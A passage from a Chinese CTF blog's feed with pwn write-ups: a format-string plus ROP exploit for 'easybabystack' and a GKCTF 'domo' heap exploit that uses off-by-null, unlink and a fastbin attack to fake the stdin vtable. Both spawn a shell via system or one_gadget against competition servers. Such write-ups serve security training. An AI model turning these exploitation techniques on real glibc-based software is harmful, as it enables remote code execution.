<span class="keyword">print</span> i</span><br><span class="line">    payload=<span class="string">"\x00"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Secret: _____            #"</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1254</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">        libc.address=leak-0x7fcb248f9690+0x7fcb2488a000</span></span><br><span class="line"><span class="string">        info("leak",leak)</span></span><br><span class="line"><span class="string">        info("libc",libc.address)</span></span><br><span class="line"><span class="string">        sleep(1)</span></span><br><span class="line"><span class="string">        p.recv()</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h2><p>这题比赛的时候也没做出来，参考fmyy师傅的题解</p><p> 格式化字符串中 *$连用表示取对应偏移位置的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">p= process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10001</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'%*18$d%5$n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x401512")</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x401733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401731</span></span><br><span class="line">binsh  =<span class="number">0x404090</span></span><br><span class="line">system = <span class="number">0x401110</span></span><br><span class="line">read_got = <span class="number">0x404038</span></span><br><span class="line">gadget_I = <span class="number">0x40172A</span></span><br><span class="line">gadget_Ii = <span class="number">0x401710</span></span><br><span class="line">payload  = <span class="string">'U'</span>*<span class="number">0x118</span></span><br><span class="line">payload += p64(gadget_I)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(gadget_Ii)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">p.recvuntil(<span class="string">'message'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;盲打1-盲打2&quot;&gt;&lt;a href=&quot;#盲打1-盲打2&quot; class=&quot;headerlink&quot; title=&quot;盲打1 盲打2&quot;&gt;&lt;/a&gt;盲打1 盲打2&lt;/h2&gt;&lt;p&gt;都是一个c语言解释器，但是不能用&lt;code&gt;()&lt;/code&gt;来写c语言，也就是不能调用函数，可以用
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/</id>
    <published>2020-05-24T10:04:51.000Z</published>
    <updated>2020-05-24T12:19:21.859Z</updated>
    
    <content type="html"><![CDATA[<h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><p>一道 domo日了一天，最后还是做出来，还是很高兴的</p><p><code>off-by-null</code>漏洞，edit功能有任意地址一字节写入，可以用来伪造堆块的size，<code>malloc_fook</code>和<code>free_hook</code>程序做有限制，然后又有<code>sanbox</code>。但是是在main函数结束的时候才生效的，只要在while循环里面调用<code>onegadget</code>，还是能反弹shell的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x0000000a  <span class="keyword">if</span> (A == mprotect) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0xffffd8b6  <span class="keyword">if</span> (A == 0xffffd8b6) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>一开始的思路是想用 <code>environ</code>来泄露 <code>stack_addr</code>然后再申请堆块到栈上用<code>orw</code>的方式来做</p><p>然后费了好大的劲，泄露出stack的地址了，stack上没有合适的size而且还有麻烦的<code>canary</code></p><p>最后选择伪造 <code>_IO_2_1_stdin_</code>的<code>vtable</code>为heap地址，heap里面存放着<code>onegadget</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdin</span><br><span class="line"><span class="variable">$1</span> = (struct _IO_FILE *) 0x7f991f79b8e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *) 0x7f991f79b8e0</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x557376e64010 <span class="string">"96\n\n95634794904\n"</span>, </span><br><span class="line">    _IO_read_end = 0x557376e64010 <span class="string">"96\n\n95634794904\n"</span>, </span><br><span class="line">    _IO_read_base = 0x557376e64010 <span class="string">"96\n\n95634794904\n"</span>, </span><br><span class="line">    _IO_write_base = 0x557376e64010 <span class="string">"96\n\n95634794904\n"</span>, </span><br><span class="line">    _IO_write_ptr = 0x557376e64010 <span class="string">"96\n\n95634794904\n"</span>, </span><br><span class="line">    _IO_write_end = 0x557376e64010 <span class="string">"96\n\n95634794904\n"</span>, </span><br><span class="line">    _IO_buf_base = 0x557376e64010 <span class="string">"96\n\n95634794904\n"</span>, </span><br><span class="line">    _IO_buf_end = 0x557376e65010 <span class="string">""</span>, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 16, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 <span class="string">'\000'</span>, </span><br><span class="line">    _shortbuf = <span class="string">""</span>, </span><br><span class="line">    _lock = 0x7f991f79d790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f991f79b9c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 113, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f991f79a6e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上是伪造 <code>_IO_file_jumps</code>结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$3 = &#123;</span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x7f991f4509c0 &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = 0x7f991f451730 &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = 0x7f991f4514a0 &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = 0x7f991f452600 &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = 0x7f991f453980 &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = 0x7f991f4501e0 &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = 0x7f991f44fec0 &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = 0x7f991f44f4c0 &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = 0x7f991f452a00 &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = 0x7f991f44f430 &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = 0x7f991f44f370 &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = 0x7f991f444180 &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = 0x7f991f4501a0 &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = 0x7f991f44fb70 &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = 0x7f991f44f970 &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = 0x7f991f44f340 &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = 0x7f991f44fb60 &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = 0x7f991f453af0 &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = 0x7f991f453b00 &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先利用<code>unsortedbin_attack</code>泄露出libc基址和heap地址</p><p>然后 <code>off-by-null</code>溢出修改下一个堆块的 size 为 <code>\x00</code>使得他被修改为释放过的</p><p>通过布局，unlink使得堆块向前合并，造成堆块重叠，<code>fastbin_attack</code> 打<code>vtable</code>,需要用edit功能提前伪造size。</p><p><code>_IO_file_jumps</code>里面全放<code>onegadget</code>然后劫持程序执行流 </p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">"environ"</span>]</span><br><span class="line">pie=libc.address+<span class="number">0x838168</span></span><br><span class="line">dl_rtld_lock_recursive=libc.address+<span class="number">0x837f48</span></span><br><span class="line"></span><br><span class="line">_IO_list_all=libc.address+<span class="number">0x7f97b2172520</span><span class="number">-0x7f97b1dad000</span></span><br><span class="line"></span><br><span class="line">io_stdin_vtable=libc.address+<span class="number">0x7f07aec479b0</span><span class="number">-0x7f07ae883000</span></span><br><span class="line">info(<span class="string">"environ"</span>,environ)</span><br><span class="line">info(<span class="string">"pie"</span>,pie)</span><br><span class="line">info(<span class="string">"dl_rtld_lock_recursive"</span>,dl_rtld_lock_recursive)</span><br><span class="line">info(<span class="string">"io_stdin_vtable"</span>,io_stdin_vtable)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + fake vtable-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(io_stdin_vtable<span class="number">-0x20</span>)) <span class="comment">#1</span></span><br><span class="line">edit(io_stdin_vtable<span class="number">-0x18</span>,<span class="string">"\x71"</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one[<span class="number">2</span>]+libc.address)*<span class="number">19</span>+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0xffffffff</span>)+<span class="string">"\x00"</span>*<span class="number">0x10</span>+p64(heap+<span class="number">0x140</span>)) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">show(2)</span></span><br><span class="line"><span class="string">leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">rbp=leak-0x7ffc34284dd8+0x7ffc34284ce0</span></span><br><span class="line"><span class="string">info("leak",leak)</span></span><br><span class="line"><span class="string">info("rbp",rbp)</span></span><br><span class="line"><span class="string">dbg(0xf1c)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">free(0)</span></span><br><span class="line"><span class="string">add(0x120,'\x12'*0x100+p64(0x110)+p64(0x70)+p64(io_sdtout-0x43)) #1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x68,"\x17"*0x10) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload='\x01'*0x33+p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+ p64(environ+0x8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x68,payload) #2</span></span><br><span class="line"><span class="string">dbg()</span></span><br><span class="line"><span class="string">leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">rbp=leak-0x7ffc34284dd8+0x7ffc34284ce0</span></span><br><span class="line"><span class="string">info("leak",leak)</span></span><br><span class="line"><span class="string">info("rbp",rbp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python3 angr 学习笔记</title>
    <link href="https://nocbtm.github.io/2020/05/21/python3-angr-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://nocbtm.github.io/2020/05/21/python3-angr-学习笔记/</id>
    <published>2020-05-21T08:44:17.000Z</published>
    <updated>2020-05-24T11:44:29.963Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-05-12T00:40:29.178Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
